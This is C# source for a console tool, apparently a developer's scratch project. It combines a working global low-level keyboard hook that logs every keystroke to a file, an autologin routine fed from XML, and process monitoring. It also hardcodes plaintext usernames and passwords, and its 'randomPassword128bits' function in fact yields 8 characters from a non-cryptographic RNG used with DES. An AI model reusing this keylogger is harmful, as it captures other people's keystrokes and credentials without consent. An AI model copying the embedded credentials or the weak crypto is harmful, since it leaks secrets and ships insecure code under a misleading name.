using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Xml;
using System.Threading.Tasks;
using System.Management;
using Microsoft.Office.Interop.Outlook;
using System.Data;
using System.Drawing;
using System.Reflection;
using Controllers;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace ConsoleApplication1
{
    class Program
    {
        private const int ERROR_SUCCESS = 0;
        private const int ERROR_BAD_ARGUMENTS = 0xA0;
        private const int ERROR_ARITHMETIC_OVERFLOW = 0x216;
        private const int ERROR_INVALID_COMMAND_LINE = 0x667;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static string path = @"C:\Users\mc26736\Desktop\keylog.txt";
        private static string username = "ga38452";
        private static string password = "i4K6Atx7";
        private static string processName = "EBO";
        private static string enviroment = "SIT";
        private static string data;
        private static string action;

        private static bool runFirstTime = true;
        private static bool runNeuron = false;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static StreamWriter sw;
        private static StreamReader sr;
        private static Neurona[] neuronas;
        private static List<string> files = new List<string>();

        private enum CtrlType
        {
            CTRL_C_EVENT = 0,
            CTRL_BREAK_EVENT = 1,
            CTRL_CLOSE_EVENT = 2,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT = 6
        }


        private delegate void RightClickEventHandler(object sender, Point mouseLocation);
        private delegate bool SetConsoleCtrlEventHandler(CtrlType sig);
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);


        private static event RightClickEventHandler RightClick;


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        [DllImport("Kernel32", ExactSpelling = true, SetLastError = true)]
        static extern bool CloseHandle(IntPtr h);


        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(SetConsoleCtrlEventHandler handler, bool add);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);


        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out Point lpPoint);



        public static void erasePDBFiles()
        {
            int count = 0;
            string path = @"C:\Users\mc26736\Desktop\DebugSINNADA";
            //string path2 = @"C:\Users\mc26736\Desktop\EboxModelo";

            //List<string> files = new List<string>(Directory.GetFiles(path).ToList());
            //List<string> files2 = new List<string>(Directory.GetFiles(path2).ToList());

            //List<string> lista = new List<string>();
            //List<string> listaModelo = new List<string>();

            //for (int i = 0; i < files.Count; i++)
            //{
            //    bool borrar = true;
            //    string name = files[i].Substring(files[i].LastIndexOf(@"\") + 1, files[i].Length - (files[i].LastIndexOf(@"\") + 1));
            //    for (int j = 0; j < files2.Count; j++)
            //    {
            //        string nameModelo = files2[j].Substring(files2[j].LastIndexOf(@"\") + 1, files2[j].Length - (files2[j].LastIndexOf(@"\") + 1));
            //        if (name == nameModelo)
            //            borrar = false;
            //    }
            //    if (borrar)
            //        File.Delete(files[i]);
            //}

            foreach (string item in Directory.GetFiles(path))
            {
                if (item.Contains(".pdb"))
                {
                    count++;
                    File.Delete(item);
                }
            }
            Console.WriteLine("Deleted count files: " + count.ToString());
        }

        public static Point GetCursorPosition()
        {
            Point lpPoint;
            GetCursorPos(out lpPoint);
            return lpPoint;
        }

        public static void RightClick_Event(object sender, Point mouseLocation)
        {
            mouseLocation = GetCursorPosition();

        }

        public static void detectProcessess()
        {
            ManagementEventWatcher startWatch = new ManagementEventWatcher(new WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace"));
            startWatch.EventArrived += new EventArrivedEventHandler(startWatch_EventArrived);
            startWatch.Start();

            ManagementEventWatcher stopWatch = new ManagementEventWatcher(new WqlEventQuery("SELECT * FROM Win32_ProcessStopTrace"));
            stopWatch.EventArrived += new EventArrivedEventHandler(stopWatch_EventArrived);
            stopWatch.Start();

            Console.WriteLine("Press ENTER to exit");
            Console.ReadLine();
            startWatch.Stop();
            stopWatch.Stop();
        }

        static void stopWatch_EventArrived(object sender, EventArrivedEventArgs e)
        {
            Console.WriteLine("Process stopped: {0}", e.NewEvent.Properties["ProcessName"].Value.ToString());
        }

        static void startWatch_EventArrived(object sender, EventArrivedEventArgs e)
        {
            if (e.NewEvent.Properties["ProcessName"].Value.ToString().Contains("EBO"))
            {
                Console.WriteLine("[SYS] EBO started");
            }
            Console.WriteLine("Process started: {0}", e.NewEvent.Properties["ProcessName"].Value.ToString());
        }

        static async Task runForm()
        {
            System.Windows.Forms.Application.Run(new Form1());
            System.Windows.Forms.Application.DoEvents();
        }


        public static string GetHashSha256(byte[] text)
        {
            try
            {
                var crypt = new SHA256Managed();
                var hash = new StringBuilder();
                byte[] buffer = crypt.ComputeHash(text);

                for (int i = 0; i < buffer.Length; i++)
                    hash.Append(buffer[i].ToString("x2"));

                return hash.ToString();
            }
            catch (System.Exception ex)
            {
                throw new System.Exception(ex.Message);
            }
        }




        static bool isSha256Unique()
        {
            bool result = false;
            List<string> hashList = new List<string>();
            try
            {
                string pathToPickFiles = @"C:\Users\mc26736\Desktop";
                string[] files = Directory.GetFiles(pathToPickFiles, "*.*", SearchOption.AllDirectories);
                for (int i = 0; i < files.Length; i++)
                {
                    if (File.Exists(files[i]))
                    {
                        byte[] buffer = File.ReadAllBytes(files[i]);
                        string hash = GetHashSha256(buffer);
                        if (hashList.Count > 0)
                        {
                            bool isInTheList = false;
                            for (int j = 0; j < hashList.Count; j++)
                            {
                                if (hashList[j] == hash)
                                {
                                    Console.WriteLine("Se genero un hash de otro archivo que ya existe en la lista de hashes..");
                                    return false;
                                }
                            }
                            if (!isInTheList)
                                hashList.Add(hash);
                        }
                        else
                            hashList.Add(hash);
                    }
                }
                result = true;
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return result;
        }

        static async Task trainNeuron()
        {
            await neuron();
        }

        static void CreateEBOPROD()
        {
            string path = @"C:\Users\mc26736\Source\Repos\NEWREPO\EBO_front_end\EBO\bin\Debug";
            string newPath = @"C:\Users\mc26736\Desktop\EBOPROD";
            if (!Directory.Exists(newPath))
                Directory.CreateDirectory(newPath);

            foreach (var file in Directory.GetFiles(path))
            {

                string extension = file.Substring(file.LastIndexOf("."), file.Length - file.LastIndexOf("."));
                if (extension == ".dll" || extension == ".exe" || extension == ".ora" || extension == ".xml")
                {
                    string fileName = file.Substring(file.LastIndexOf(@"\") + 1, file.Length - file.LastIndexOf(@"\") - 1);
                    File.Copy(file, newPath + @"\" + fileName);
                }
            }
        }

        static async Task neuron()
        {
            decimal[] inputs = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };
            neuronas = new Neurona[inputs.Length];

            for (int i = 1; i < inputs.Length + 1; i++)
            {
                neuronas[i - 1] = new Neurona(inputs, i);
                neuronas[i - 1].Train();
            }
        }

        public static int GetSizeOfObject(object obj, int avgStringSize = -1)
        {
            int pointerSize = IntPtr.Size;
            int size = 0;
            Type type = obj.GetType();
            var info = type.GetFields(BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
            foreach (var field in info)
            {
                if (field.FieldType.IsValueType)
                    size += Marshal.SizeOf(field.FieldType);
                else
                {
                    size += pointerSize;
                    if (field.FieldType.IsArray)
                    {
                        var array = field.GetValue(obj) as Array;
                        if (array != null)
                        {
                            var elementType = array.GetType().GetElementType();
                            if (elementType.IsValueType)
                                size += Marshal.SizeOf(field.FieldType) * array.Length;
                            else
                            {
                                size += pointerSize * array.Length;
                                if (elementType == typeof(string) && avgStringSize > 0)
                                    size += avgStringSize * array.Length;
                            }
                        }
                    }
                    else if (field.FieldType == typeof(string) && avgStringSize > 0)
                        size += avgStringSize;
                }
            }
            return size;
        }

        public static string randomPassword128bits()
        {
            string result = string.Empty;
            int size = 8;
            byte[] buffer = new byte[size];
            Random ran = new Random();
            for (int i = 0; i < buffer.Length; i++)
            {
                buffer[i] = Convert.ToByte(ran.Next(65, 128));
                result += (char)buffer[i];
            }
            return result;
        }

        public static void testEncription()
        {
            password = "susta250";//randomPassword128bits();

            bool result = SecurityController.FileEncryptDES(@"C:\Users\mc26736\Desktop\Files\ConsoleApplication1.zip", password);
            if (result)
            {
                result = SecurityController.FileDecryptDES(@"C:\Users\mc26736\Desktop\Files\ConsoleApplication1.zip.crp", password);
                Console.WriteLine(password);
            }
            else
                Console.WriteLine("Se malgasto por: " + SecurityController.error);
            Console.Read();
        }

        [STAThread]
        static void Main(string[] args)
        {


            //testEncription();

            Sistem s = new Sistem();
            int result = AsyncSocketServer.Main(args);


            // erasePDBFiles();

            if (runNeuron)
            {
                Task action = Task.Run(() => trainNeuron());
                action.Wait();
            }
            else
            {
                RightClick += new RightClickEventHandler(RightClick_Event);

                if (!runFirstTime)
                {
                    Task.Run(() => runForm());
                    runFirstTime = true;
                }

                initialize();

                if (action.Contains("k"))
                    Keylogg();
                else
                    Autologin();
            }
        }

        private static void initialize()
        {
            Console.Title = "H4x0r";
            Console.WriteLine("Action: keylogger/login");
            action = Console.ReadLine();
        }

        private static void Autologin()
        {
            string xmlLoginPath = Directory.GetCurrentDirectory() + "\\XMLS" + "\\Login.xml";
            if (File.Exists(xmlLoginPath))
            {
                XmlDocument xmldoc = new XmlDocument();
                xmldoc.Load(xmlLoginPath);
                foreach (XmlNode node in xmldoc.ChildNodes)
                {
                    if (node.Name == "Logins")
                    {
                        foreach (XmlNode node2 in node.ChildNodes)
                        {
                            if (node2.Name == enviroment)
                            {
                                foreach (XmlNode node3 in node2.ChildNodes)
                                {
                                    switch (node3.Name)
                                    {
                                        default:
                                            break;
                                        case "User":
                                            username = node3.InnerText.ToString();
                                            break;
                                        case "Password":
                                            password = node3.InnerText.ToString();
                                            break;
                                        case "ProcessName":
                                            processName = node3.InnerText.ToString();
                                            break;
                                    }
                                }
                            }
                        }
                    }
                }
                AutoLoginPro.AutoLoginPro.detectEBO(username, password, processName);
                Main(null);
            }
        }

        private static void initializeKeylogg()
        {
            Console.Title = "Keylogg";

            if (File.Exists(path))
            {
                sr = new StreamReader(path);
                data = sr.ReadToEnd();
                sr.Close();
            }
        }

        private static void Keylogg()
        {
            initializeKeylogg();

            SetConsoleCtrlHandler(Handler, true);

            System.Windows.Forms.Application.EnableVisualStyles();
            System.Windows.Forms.Application.SetCompatibleTextRenderingDefault(false);

            _hookID = SetHook(_proc);

            System.Windows.Forms.Application.Run();

            UnhookWindowsHookEx(_hookID);
        }

        private static bool Handler(CtrlType signal)
        {
            switch (signal)
            {
                case CtrlType.CTRL_BREAK_EVENT:
                case CtrlType.CTRL_C_EVENT:
                case CtrlType.CTRL_LOGOFF_EVENT:
                case CtrlType.CTRL_SHUTDOWN_EVENT:
                case CtrlType.CTRL_CLOSE_EVENT:
                    sw = new StreamWriter(path);
                    sw.Write(data);
                    sw.Close();
                    Environment.Exit(ERROR_SUCCESS);
                    return false;

                default:
                    return false;
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (vkCode != (int)Keys.Space && vkCode != (int)Keys.Back)
                {
                    data = data + (Keys)vkCode;
                    Console.Clear();
                    Console.Write(data);
                }
                else if (vkCode == (int)Keys.Space)
                {
                    data = data + " ";
                    Console.Write((Keys)vkCode);
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

    }
}